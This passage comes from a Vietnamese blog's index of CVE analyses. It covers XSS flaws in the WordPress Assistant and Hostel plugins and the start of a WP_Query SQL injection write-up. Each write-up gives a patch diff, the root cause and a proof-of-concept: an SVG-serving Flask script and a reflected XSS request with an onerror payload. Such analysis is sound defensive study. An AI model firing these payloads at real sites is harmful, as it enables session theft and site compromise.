n√≥ s·∫Ω th·ª±c thi m√£ ƒë·ªôc =\u003e g√¢y ra l·ªó h·ªïng XSS. ","date":"2025-10-03","objectID":"/vi/posts/2025-10-03-cve-2025-53307/:2:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/vi/posts/2025-10-03-cve-2025-53307/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff\rD√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. Diff gi·ªØa b·∫£n l·ªói v√† b·∫£n v√° Trong tr∆∞·ªùng h·ª£p n√†y, s·ª± kh√°c bi·ªát gi·ªØa 2 phi√™n b·∫£n kh√° nhi·ªÅu, ƒë·ªÉ thu·∫≠n l·ª£i cho vi·ªác truy v·∫øt, ta c√≥ th·ªÉ xem change log ƒë·ªÉ bi·∫øt b·∫£n v√° l·ªó h·ªïng XSS ·ªü ƒë√¢u: Changelog 1.5.3 ( 2025-09-08 ) - Changes to support the integration of Assistant in Beaver Builder version 2.10 - Fixed dark mode issues on the Home app and sidebar. - Security: Fixed a potential XSS vulnerability in the \"image proxy\" üëâ L·ªó h·ªóng n·∫±m trong file backend/src/Hooks/ImageProxy.php, ta quan s√°t s·ª± kh√°c bi·ªát c·ªßa 2 phi√™n b·∫£n: S·ª± kh√°c bi·ªát trong h√†m render_image c·ªßa ImageProxy.php S·ª± thay ƒë·ªïi x·∫£y ra ·ªü h√†m render_image v·ªõi ch·ª©c nƒÉng: Nh·∫≠n tham s·ªë url t·ª´ query string ($_GET['url']). G·ª≠i request t·ª´ server ƒë·∫øn URL ƒë√≥ ƒë·ªÉ t·∫£i n·ªôi dung. Ch·ªëng ssrf b·∫±ng wp_safe_remote_get. N·∫øu n·ªôi dung c√≥ header Content-Type b·∫Øt ƒë·∫ßu b·∫±ng image/, th√¨: G·ª≠i l·∫°i header Content-Type ƒë√≥ cho client. In (echo) to√†n b·ªô n·ªôi dung file ra cho tr√¨nh duy·ªát. Tr√¨nh duy·ªát hi·ªÉn th·ªã h√¨nh ·∫£nh kh√¥ng ph·∫£i tr·ª±c ti·∫øp t·ª´ ngu·ªìn g·ªëc m√† th√¥ng qua server WordPress. SVG c≈©ng c√≥ Content-Type b·∫Øt ƒë·∫ßu b·∫±ng image/ v√† c√≥ th·ªÉ ch·ª©a m√£ JavaScript b√™n trong =\u003e XSS c√≥ th·ªÉ x·∫£y ra. B·∫£n v√° ƒë√£ th√™m m·ªôt l·ªõp ki·ªÉm tra MIME type th·ª±c s·ª± c·ªßa file ƒë·ªÉ tr√°nh k·ªãch b·∫£n XSS b·∫±ng SVG hay file gi·∫£ m·∫°o. $filesystem = self::filesystem(); $tmpfile = tempnam( '/tmp', 'assistant' ); $filesystem-\u003eput_contents( $tmpfile, $body ); $validimage = wp_get_image_mime( $tmpfile ); $filesystem-\u003edelete( $tmpfile ); if ( ! $validimage ) { return false; } wp_get_image_mime() s·ª≠ d·ª•ng h√†m x·ª≠ l√Ω ·∫£nh n·ªôi b·ªô (d·ª±a tr√™n d·ªØ li·ªáu binary c·ªßa file) ƒë·ªÉ x√°c ƒë·ªãnh MIME th·ª±c s·ª±. N·∫øu k·∫øt qu·∫£ kh√¥ng ph·∫£i l√† ·∫£nh h·ª£p l·ªá =\u003e return false. ","date":"2025-10-03","objectID":"/vi/posts/2025-10-03-cve-2025-53307/:2:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/vi/posts/2025-10-03-cve-2025-53307/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"How it work?\rTrong __construct c·ªßa class ImageProxy, ph∆∞∆°ng th·ª©c render_image() ƒë∆∞·ª£c g·ªçi th√¥ng qua callback c·ªßa action hook 'init'. Hook 'init' ƒë∆∞·ª£c th·ª±c thi r·∫•t s·ªõm trong qu√° tr√¨nh load WordPress, sau khi c√°c ƒë·ªëi t∆∞·ª£ng core ƒë∆∞·ª£c kh·ªüi t·∫°o nh∆∞ng tr∆∞·ªõc khi g·ª≠i output ra tr√¨nh duy·ªát. render_image ch·ªâ ƒë∆∞·ª£c g·ªçi khi ng∆∞·ªùi d√πng hi·ªán t·∫°i c√≥ quy·ªÅn ch·ªânh s·ª≠a b√†i vi·∫øt c·ªßa ng∆∞·ªùi kh√°c v√† tham s·ªë $_GET['fl_asst_image_proxy'] t·ªìn t·∫°i. üëâ Khi truy c·∫≠p /wp-admin/?fl_asst_image_proxy=value1\u0026url=http://yoursite/image-path th√¨ render_image s·∫Ω ƒë∆∞·ª£c g·ªçi v√† tr·∫£ v·ªÅ n·ªôi dung h√¨nh ·∫£nh cho tr√¨nh duy·ªát hi·ªÉn th·ªã. ","date":"2025-10-03","objectID":"/vi/posts/2025-10-03-cve-2025-53307/:2:2","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/vi/posts/2025-10-03-cve-2025-53307/#how-it-work"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-03","objectID":"/vi/posts/2025-10-03-cve-2025-53307/:3:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/vi/posts/2025-10-03-cve-2025-53307/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Detect XSS\rT·∫°o 1 trang web ƒë∆°n gi·∫£n tr·∫£ v·ªÅ n·ªôi dung SVG ch·ª©a XSS payload from flask import Flask, Response app = Flask(__name__) @app.route('/') def home(): return 'Hello, World!' @app.route('/svg') def about(): svg = \"\"\"\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003csvg xmlns=\"http://www.w3.org/2000/svg\"\u003e \u003cscript\u003ealert(document.domain)\u003c/script\u003e \u003c/svg\u003e\"\"\" return Response(svg, mimetype=\"image/svg+xml\") G·ª≠i request ch·ª©a url param tr·ªè ƒë·∫øn https://yoursite/svg http://localhost/wp-admin/?fl_asst_image_proxy=abc\u0026url=https://yoursite/svg üëâ Th√†nh c√¥ng v·ªõi Unauthenticated v√¨ ch·ªâ c·∫ßn ng∆∞·ªùi d√πng c√≥ quy·ªÅn, khi truy c·∫≠p url =\u003e XSS x·∫£y ra tr√™n tr√¨nh duy·ªát c·ªßa n·∫°n nh√¢n. Attacker kh√¥ng c·∫ßn ƒëƒÉng nh·∫≠p. SVG ch·ª©a XSS payload ƒë∆∞·ª£c hi·ªÉn th·ªã qua image proxy ","date":"2025-10-03","objectID":"/vi/posts/2025-10-03-cve-2025-53307/:3:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/vi/posts/2025-10-03-cve-2025-53307/#detect-xss"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rL·ªó h·ªïng CVE-2025-53307 trong plugin WordPress Assistant (\u003c= v1.5.2) cho ph√©p XSS th√¥ng qua render_image() v√¨ kh√¥ng ki·ªÉm tra MIME type th·ª±c c·ªßa file. B·∫£n v√° v1.5.3 ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch x√°c th·ª±c n·ªôi dung file tr∆∞·ªõc khi tr·∫£ v·ªÅ tr√¨nh duy·ªát. Key takeaways: Kh√¥ng tin c·∫≠y v√†o Content-Type header t·ª´ HTTP response. Lu√¥n x√°c th·ª±c MIME type th·ª±c s·ª± c·ªßa file. ","date":"2025-10-03","objectID":"/vi/posts/2025-10-03-cve-2025-53307/:4:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/vi/posts/2025-10-03-cve-2025-53307/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rCross-site scripting (XSS) cheat sheet WordPress WordPress Assistant Plugin \u003c= 1.5.2 is vulnerable to Cross Site Scripting (XSS) ","date":"2025-10-03","objectID":"/vi/posts/2025-10-03-cve-2025-53307/:5:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/vi/posts/2025-10-03-cve-2025-53307/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Hostel Plugin.","date":"2025-10-02","objectID":"/vi/posts/2025-10-02-cve-2025-6234/","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/vi/posts/2025-10-02-cve-2025-6234/"},{"categories":["CVE Analysis"],"collections":null,"content":"L·ªó h·ªïng x·∫£y ra tr√™n plugin Hostel c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 1.1.5.8. K·∫ª t·∫•n c√¥ng c√≥ th·ªÉ l·ª£i d·ª•ng l·ªó h·ªïng n√†y ƒë·ªÉ t·∫•n c√¥ng ng∆∞·ªùi d√πng c√≥ quy·ªÅn cao nh∆∞ admin. CVE ID: CVE-2025-6234 Product: WordPress Hostel Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u003c 1.1.5.8 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated ","date":"2025-10-02","objectID":"/vi/posts/2025-10-02-cve-2025-6234/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/vi/posts/2025-10-02-cve-2025-6234/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Hostel Plugin: v1.1.5.7(vul) v√† v1.1.5.8(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version ","date":"2025-10-02","objectID":"/vi/posts/2025-10-02-cve-2025-6234/:1:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/vi/posts/2025-10-02-cve-2025-6234/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rNguy√™n nh√¢n g·ªëc r·ªÖ do kh√¥ng th·ª±c hi·ªán sanitize (l√†m s·∫°ch d·ªØ li·ªáu) v√† escape (m√£ h√≥a d·ªØ li·ªáu ƒë·∫ßu ra) ƒë·ªëi v·ªõi m·ªôt tham s·ªë tr∆∞·ªõc khi ph·∫£n h·ªìi l·∫°i tr√™n trang, d·∫´n ƒë·∫øn l·ªó h·ªïng Reflected Cross-Site Scripting (XSS) ","date":"2025-10-02","objectID":"/vi/posts/2025-10-02-cve-2025-6234/:2:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/vi/posts/2025-10-02-cve-2025-6234/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff\rD√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü 2 file views/bookings.html.php v√† controllers/bookings.php File views/bookings.html.php \u003cp align=\"center\"\u003e \u003c?php if($offset \u003e 0):?\u003e \u003ca href=\"admin.php?page=wphostel_bookings\u0026type=\u003c?php echo $type?\u003e\u0026offset=\u003c?php echo $offset - $page_limit?\u003e\u0026ob=\u003c?php echo @$_GET['ob']?\u003e\"\u003e\u003c?php _e('[previous page]', 'wphostel')?\u003e\u003c/a\u003e \u003c?php endif;?\u003e \u003c?php if($count \u003e ($page_limit + $offset)):?\u003e \u003ca href=\"admin.php?page=wphostel_bookings\u0026type=\u003c?php echo $type?\u003e\u0026offset=\u003c?php echo $offset + $page_limit?\u003e\u0026ob=\u003c?php echo @$_GET['ob']?\u003e\"\u003e\u003c?php _e('[next page]', 'wphostel')?\u003e\u003c/a\u003e \u003c?php endif;?\u003e \u003c/p\u003e Tham s·ªë ob ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ $_GET['ob'] v√† echo ra HTML attribute m√† kh√¥ng c√≥ b·∫•t k√¨ x·ª≠ l√Ω escape n√†o. ƒêi·ªÅu n√†y d·∫´n ƒë·∫øn nguy c∆° Reflected XSS (Cross-Site Scripting), v√¨ attacker c√≥ th·ªÉ ch√®n payload v√†o query string, \u003cp align=\"center\"\u003e \u003c?php if($offset \u003e 0):?\u003e \u003ca href=\"admin.php?page=wphostel_bookings\u0026type=\u003c?php echo $type?\u003e\u0026offset=\u003c?php echo $offset - $page_limit?\u003e\u0026ob=\u003c?php echo esc_attr($_GET['ob'] ?? '')?\u003e\"\u003e\u003c?php _e('[previous page]', 'wphostel')?\u003e\u003c/a\u003e \u003c?php endif;?\u003e \u003c?php if($count \u003e ($page_limit + $offset)):?\u003e \u003ca href=\"admin.php?page=wphostel_bookings\u0026type=\u003c?php echo $type?\u003e\u0026offset=\u003c?php echo $offset + $page_limit?\u003e\u0026ob=\u003c?php echo esc_attr($_GET['ob'] ?? '')?\u003e\"\u003e\u003c?php _e('[next page]', 'wphostel')?\u003e\u003c/a\u003e \u003c?php endif;?\u003e \u003c/p\u003e B·∫£n v√° ƒë√£ s·ª≠ d·ª•ng h√†m esc_attr() ƒë·ªÉ encode $_GET['ob'] th√†nh d·∫°ng an to√†n tr∆∞·ªõc khi echo ra HTML attribute. Diff gi·ªØa code d·ªÖ b·ªã l·ªói v√† code ƒë√£ v√° Source: $_GET['ob'] l√† d·ªØ li·ªáu nh·∫≠p t·ª´ client (URL query string), attacker c√≥ th·ªÉ ki·ªÉm so√°t ho√†n to√†n. Sink: echo trong HTML attribute ob=\u003c?php echo @$_GET['ob']?\u003e üëâ V√¨ source kh√¥ng ƒëi qua logic c·ªßa controllers n√™n ta kh√¥ng c·∫ßn quan t√¢m diff c·ªßa controllers/bookings.php ","date":"2025-10-02","objectID":"/vi/posts/2025-10-02-cve-2025-6234/:2:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/vi/posts/2025-10-02-cve-2025-6234/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"How it work?\rƒê·ªÉ $_GET['ob'] ƒë∆∞·ª£c echo ra HTML attribute c·ªßa th·∫ª \u003ca\u003e th√¨ ƒëi·ªÅu ki·ªán trong kh·ªëi if ch·ª©a th·∫ª \u003ca\u003e ph·∫£i true \u003c?php if($offset \u003e 0):?\u003e // ob=\u003c?php echo @$_GET['ob']?\u003e \u003c?php endif;?\u003e \u003c?php if($count \u003e ($page_limit + $offset)):?\u003e // ob=\u003c?php echo @$_GET['ob']?\u003e \u003c?php endif;?\u003e üëâ ƒêi·ªÅu ki·ªán quan tr·ªçng c·∫ßn ch√∫ √Ω l√† if($offset \u003e 0), v√¨ ch·ªâ c·∫ßn ƒëi·ªÅu ki·ªán n√†y ƒë√∫ng th√¨ XSS ƒë√£ c√≥ th·ªÉ x·∫£y ra. Kh√¥ng c·∫ßn quan t√¢m if($count \u003e ($page_limit + $offset)). File views/bookings.html.php kh√¥ng th·ªÉ truy c·∫≠p tr·ª±c ti·∫øp, m√† ph·∫£i ƒë∆∞·ª£c controllers g·ªçi th√¥ng qua h√†m include() Bi·∫øn $offset ƒë∆∞·ª£c controller kh·ªüi t·∫°o tr∆∞·ªõc r·ªìi truy·ªÅn sang view (views/bookings.html.php) ƒë·ªÉ d√πng trong m·ªánh ƒë·ªÅ if. ƒê·ªÉ x√°c ƒë·ªãnh controller n√†o g·ªçi file view n√†y, ta t√¨m ki·∫øm bi·∫øn $offset trong th∆∞ m·ª•c controllers c·ªßa plugin. T√¨m bi·∫øn $offset trong th∆∞ m·ª•c controllers K·∫øt qu·∫£ cho th·∫•y $offset ƒë∆∞·ª£c t·∫°o trong nh√°nh default (listing bookings) c·ªßa h√†m tƒ©nh manage() trong class WPHostelBookings, n·∫±m ·ªü file controllers/bookings.php. Controller Code class WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET['do']) { // other logic // list bookings default: // which bookings to show - upcoming or past? $type = empty($_GET['type']) ? 'upcoming' : sanitize_text_field($_GET['type']); $offset = empty($_GET['offset']) ? 0 : intval($_GET['offset']); $dir = empty($_GET['dir']) ? 'ASC' : $_GET['dir']; if($dir != 'ASC' and $dir != 'DESC') $dir = 'ASC'; $odir = ($dir == 'ASC') ? 'DESC' : 'ASC'; // other logic // define limit (as it's paginated) $page_limit = 20; $limit_sql = empty($_GET['export']) ? $wpdb-\u003eprepare(\"LIMIT %d, %d\", $offset, $page_limit) : ''; // other logic $bookings = $wpdb-\u003eget_results(\"SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \".WPHOSTEL_BOOKINGS.\" tB JOIN \".WPHOSTEL_ROOMS.\" tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\"); $count = $wpdb-\u003eget_var(\"SELECT FOUND_ROWS()\"); // other logic if(@file_exists(get_stylesheet_directory().'/wphostel/bookings.html.php')) include get_stylesheet_directory().'/wphostel/bookings.html.php'; else include(WPHOSTEL_PATH.\"/views/bookings.html.php\"); break; } } } Ph√¢n t√≠ch bi·∫øn $offset Bi·∫øn $offset ƒë∆∞·ª£c kh·ªüi t·∫°o t·ª´ tham s·ªë offset trong URL ($_GET['offset']): N·∫øu kh√¥ng c√≥ tham s·ªë =\u003e m·∫∑c ƒë·ªãnh 0. N·∫øu c√≥ =\u003e √©p ki·ªÉu s·ªë nguy√™n b·∫±ng intval(). $offset = empty($_GET['offset']) ? 0 : intval($_GET['offset']); Ph√¢n t√≠ch bi·∫øn $page_limit $page_limit ƒë∆∞·ª£c ƒë·∫∑t c·ªë ƒë·ªãnh l√† 20, d√πng k·∫øt h·ª£p v·ªõi $offset ƒë·ªÉ ph√¢n trang: // define limit (as it's paginated) $page_limit = 20; // LIMIT offset, 20 $limit_sql = empty($_GET['export']) ? $wpdb-\u003eprepare(\"LIMIT %d, %d\", $offset, $page_limit) : ''; Khi ƒë√≥ SQL tr·∫£ v·ªÅ t·ªëi ƒëa 20 b·∫£n ghi, b·∫Øt ƒë·∫ßu t·ª´ v·ªã tr√≠ $offset. √Åp d·ª•ng v√†o m·ªánh ƒë·ªÅ if: Trong view, ƒëo·∫°n code XSS payload ch·ªâ hi·ªÉn th·ªã khi: if($offset \u003e 0) =\u003e t·ª©c l√† ph·∫£i c√≥ offset t·ª´ 1 tr·ªü l√™n. Mu·ªën offset \u003e 0 c√≥ √Ω nghƒ©a, c∆° s·ªü d·ªØ li·ªáu ph·∫£i c√≥ √≠t nh·∫•t 2 booking. N·∫øu ch·ªâ c√≥ 1 booking th√¨ sau khi b·ªè qua 1 d√≤ng (offset=1), kh√¥ng c√≤n d·ªØ li·ªáu n√†o ƒë·ªÉ hi·ªÉn th·ªã, n√™n payload c≈©ng kh√¥ng render ra. üëâ Do ƒë√≥, ƒë·ªÉ khai th√°c th√†nh c√¥ng, c·∫ßn c√≥ t·ªëi thi·ªÉu 2 booking trong database. Cu·ªëi c√πng c√°c k·∫øt qu·∫£ ƒë∆∞·ª£c ch·ª©a trong c√°c bi·∫øn s·∫Ω ƒë∆∞·ª£c hi·ªÉn th·ªã ra views th√¥ng qua h√†m include() if(@file_exists(get_stylesheet_directory().'/wphostel/bookings.html.php')) include get_stylesheet_directory().'/wphostel/bookings.html.php'; else include(WPHOSTEL_PATH.\"/views/bookings.html.php\"); WPHOSTEL_PATH c√≥ th·ªÉ l√† h·∫±ng global ƒë∆∞·ª£c s·ª≠ d·ª•ng sau khi file PHP ch·ª©a n√≥ ƒë∆∞·ª£c load, ƒê·ªÉ bi·∫øt ƒë∆∞·ª£c ch√≠nh x√°c, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a WPHOSTEL_PATH. ƒê∆∞·ªùng d·∫´n tuy·ªát ƒë·ªëi t·ªõi th∆∞ m·ª•c plugin ","date":"2025-10-02","objectID":"/vi/posts/2025-10-02-cve-2025-6234/:2:2","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/vi/posts/2025-10-02-cve-2025-6234/#how-it-work"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\rRequest v·ªõi XSS payload GET /wp-admin/admin.php?page=wphostel_bookings\u0026type=upcoming\u0026offset=1\u0026ob=\"\u003e\u003cimg+src%3D1+onerror%3Dalert%28document.domain%29\u003e HTTP/1.1 Payload th·ª±c t·∫ø: \"\u003e\u003cimg src=x onerror=alert(document.domain)\u003e ƒê√≥ng th·∫ª \u003ca\u003e b·∫±ng k√Ω t·ª± \"\u003e. Ch√®n th√™m th·∫ª \u003cimg\u003e c√≥ thu·ªôc t√≠nh onerror ƒë·ªÉ k√≠ch ho·∫°t JavaScript. D√πng alert(document.domain) thay cho alert(1) nh∆∞ m·ªôt th√≥i quen, nh·∫±m ch·ª©ng minh r√µ r√†ng kh·∫£ nƒÉng ƒë·ªçc th√¥ng tin t·ª´ DOM. ƒêi·ªÅu n√†y c≈©ng gi√∫p tr√°nh tr∆∞·ªùng h·ª£p Sandbox Domain khi·∫øn cho t√°c ƒë·ªông c·ªßa payload b·ªã xem nh·∫π ho·∫∑c kh√¥ng c√≥. K·∫øt qu·∫£: XSS ph·∫£n chi·∫øu th√†nh c√¥ng ","date":"2025-10-02","objectID":"/vi/posts/2025-10-02-cve-2025-6234/:3:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/vi/posts/2025-10-02-cve-2025-6234/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rL·ªó h·ªïng CVE-2025-6234 trong plugin WordPress Hostel b·∫Øt ngu·ªìn t·ª´ vi·ªác kh√¥ng x·ª≠ l√Ω ƒë√∫ng d·ªØ li·ªáu ƒë·∫ßu v√†o ($_GET['ob']) tr∆∞·ªõc khi ph·∫£n h·ªìi l·∫°i tr√™n giao di·ªán. ƒêi·ªÅu n√†y m·ªü ra kh·∫£ nƒÉng cho attacker ch√®n m√£ ƒë·ªôc Reflected XSS. B·∫£n v√° ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch s·ª≠ d·ª•ng h√†m esc_attr() ƒë·ªÉ escape d·ªØ li·ªáu tr∆∞·ªõc khi in ra HTML, ƒë·∫£m b·∫£o r·∫±ng c√°c gi√° tr·ªã kh√¥ng tin c·∫≠y kh√¥ng th·ªÉ ch√®n script ƒë·ªôc h·∫°i. Key takeaways: Lu√¥n sanitize d·ªØ li·ªáu ƒë·∫ßu v√†o v√† escape d·ªØ li·ªáu ƒë·∫ßu ra theo ng·ªØ c·∫£nh (context). V·ªõi WordPress, t·∫≠n d·ª•ng c√°c h√†m built-in nh∆∞ sanitize_text_field(), esc_attr(), esc_html(), wp_kses()‚Ä¶ ƒë·ªÉ gi·∫£m thi·ªÉu r·ªßi ro b·∫£o m·∫≠t. ","date":"2025-10-02","objectID":"/vi/posts/2025-10-02-cve-2025-6234/:4:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/vi/posts/2025-10-02-cve-2025-6234/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rXSSCross-site scripting (XSS) cheat sheet - PortSwigger WordPress Hostel Plugin \u003c 1.1.5.8 is vulnerable to Cross Site Scripting (XSS) - patchstack ","date":"2025-10-02","objectID":"/vi/posts/2025-10-02-cve-2025-6234/:5:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/vi/posts/2025-10-02-cve-2025-6234/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Core.","date":"2025-10-01","objectID":"/vi/posts/2025-10-01-cve-2022-21661/","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/vi/posts/2025-10-01-cve-2022-21661/"},{"categories":["CVE Analysis"],"collections":null,"content":"Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu (sanitization) kh√¥ng ƒë√∫ng c√°ch trong WP_Query, c√≥ nh·ªØng tr∆∞·ªùng h·ª£p c√≥ th·ªÉ x·∫£y ra SQL Injection th√¥ng qua c√°c plugin ho·∫∑c theme s·ª≠ d·ª•ng n√≥ theo m·ªôt c√°ch nh·∫•t ƒë·ªãnh. L·ªó h·ªïng n√†y ƒë√£ ƒë∆∞·ª£c v√° trong WordPress phi√™n b·∫£n 5.8.3. C√°c phi√™n b·∫£n c≈© h∆°n b·ªã ·∫£nh h∆∞·ªüng c≈©ng ƒë√£ ƒë∆∞·ª£c s·ª≠a th√¥ng qua b·∫£n ph√°t h√†nh b·∫£o m·∫≠t, quay ng∆∞·ª£c l·∫°i ƒë·∫øn t·∫≠n phi√™n b·∫£n 3.7.37. CVE ID: CVE-2022-21661 Product: WordPress Vulnerability Type: SQL Injection Affected Versions: 3.7.37 ‚â§ version \u003c 5.8.3 CVSS severity: High (8.0) ","date":"2025-10-01","objectID":"/vi/posts/2025-10-01-cve-2022-21661/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/vi/posts/2025-10-01-cve-2022-21661/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. WordPress: v5.8.2(vul) ","date":"2025-10-01","objectID":"/vi/posts/2025-10-01-cve-2022-21661/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/vi/posts/2025-10-01-cve-2022-21661/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Setup\r","date":"2025-10-01","objectID":"/vi/posts/2025-10-01-cve-2022-21661/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/vi/posts/2025-10-01-cve-2022-21661/#setup"},{"categories":["CVE Analysis"],"collections":null,"content":"Required PHP Version\rWordPress ƒë∆∞·ª£c x√¢y d·ª±ng ho√†n to√†n b·∫±ng PHP, v√¨ v·∫≠y phi√™n b·∫£n PHP tr√™n m√°y ch·ªß c√≥ ·∫£nh h∆∞·ªüng tr·ª±c ti·∫øp ƒë·∫øn kh·∫£ nƒÉng ho·∫°t ƒë·ªông c·ªßa WordPress: M·ªói phi√™n b·∫£n PHP ƒë·ªÅu b·ªï sung t√≠nh nƒÉng m·ªõi v√† lo·∫°i b·ªè d·∫ßn c√°c h√†m/c√∫ ph√°p l·ªói th·ªùi. N·∫øu WordPress d√πng t√≠nh nƒÉng m·ªõi nh∆∞ng PHP tr√™n server qu√° c≈© =\u003e s·∫Ω ph√°t sinh l·ªói c√∫ ph√°p (syntax error) ho·∫∑c kh√¥ng ch·∫°y ƒë∆∞·ª£c. Ng∆∞·ª£c l·∫°i, n·∫øu PHP qu√° m·ªõi, m·ªôt s·ªë h√†m c≈© m√† WordPress v·∫´n c√≤n s·ª≠ d·ª•ng c√≥ th·ªÉ ƒë√£ deprecated ho·∫∑c b·ªã lo·∫°i b·ªè ho√†n to√†n, g√¢y l·ªói khi ch·∫°y. üëâ Do ƒë√≥, c·∫ßn l·ª±a ch·ªçn phi√™n b·∫£n PHP t∆∞∆°ng th√≠ch v·ªõi phi√™n b·∫£n WordPress. Trong ph√¢n t√≠ch n√†y, ta s·ª≠ d·ª•ng PHP 7.4 ƒë·ªÉ c√†i ƒë·∫∑t WordPress 5.8.2. ","date":"2025-10-01","objectID":"/vi/posts/2025-10-01-cve-2022-21661/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/vi/posts/2025-10-01-cve-2022-21661/#required-php-version"},{"categories":["CVE Analysis"],"collections":null,"content":"VSCode Extensions\rWordPress c√≥ m√£ ngu·ªìn ph·ª©c t·∫°p, n√™n vi·ªác ƒë·ªçc t·ª´ng d√≤ng code th·ªß c√¥ng l√† kh√¥ng kh·∫£ thi. ƒê·ªÉ h·ªó tr·ª£ qu√° tr√¨nh debug v√† truy v·∫øt, ta c·∫ßn c√†i ƒë·∫∑t th√™m hai extension sau trong VS Code: PHP Extension Pack =\u003e t√¨m b·∫±ng t·ª´ kh√≥a: xdebug.php-pack PHP Tools for VS Code =\u003e t√¨m b·∫±ng t·ª´ kh√≥a: devsense.phptools-vscode ","date":"2025-10-01","objectID":"/vi/posts/2025-10-01-cve-2022-21661/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/vi/posts/2025-10-01-cve-2022-21661/#vscode-extensions"},{"categories":["CVE Analysis"],"collections":null,"content":"Custom Plugin\rV√¨ l·ªó h·ªïng SQLi n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn WordPress Core, nh∆∞ng ch·ªâ c√≥ th·ªÉ khai th√°c gi√°n ti·∫øp th√¥ng qua plugin ho·∫∑c theme s·ª≠ d·ª•ng WP_Query, n√™n ta c·∫ßn th√¥ng qua m·ªôt plugin ho·∫∑c theme ƒë·ªÉ t·∫°o t∆∞∆°ng t√°c v·ªõi WP_Query. Ta x√¢y d·ª±ng plugin s·ª≠ d·ª•ng WP_Query, hi·ªÉn th·ªã query ƒë∆∞·ª£c th·ª±c thi th√¥ng qua WP_Query::request. \u003c?php /** * Plugin Name: Demo WP_Query * Description: Plugin demo WP_Query * Version: 1.0 * Author: w41bu1 */ if (!defined('ABSPATH')) exit; function da_show_posts() { $args = [ 'post_type' =\u003e 'post', 'tax_query' =\u003e [ [ 'taxonomy' =\u003e 'category', 'field' =\u003e 'term_taxonomy_id', 'terms' =\u003e [1,2,3], 'operator' =\u003e 'IN', ], ], ]; $query = new WP_Query($args); ob_start(); echo '\u003ch3\u003eDemo WP_Query\u003c/h3\u003e'; echo '\u003cpre style=\"background:#f0f0f0; padding:15px; width:100%; white-space:pre-wrap; word-wrap:break-word; 